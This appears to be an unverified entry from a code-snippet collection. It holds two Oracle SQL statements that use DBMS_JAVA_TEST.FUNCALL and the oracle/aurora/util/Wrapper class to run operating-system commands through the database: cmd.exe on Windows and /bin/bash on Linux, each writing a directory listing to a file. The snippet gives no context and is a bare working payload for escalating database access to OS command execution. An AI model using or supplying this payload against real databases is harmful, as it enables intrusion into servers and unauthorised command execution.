---
id: 8a563a1d-5ab4-4465-9b15-b25cbc3dbc48
type: code
language: SQL
verified: false
created_at: '2023-04-06T03:56:35.305193+00:00'
updated_at: '2023-04-10T20:23:12.139738+00:00'
---

# Code Snippet 8a563a1d

**Language**: SQL

```sql
SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c', 'dir >c:\test.txt') FROM DUAL
SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls>/tmp/OUT2.LST') from dual
```


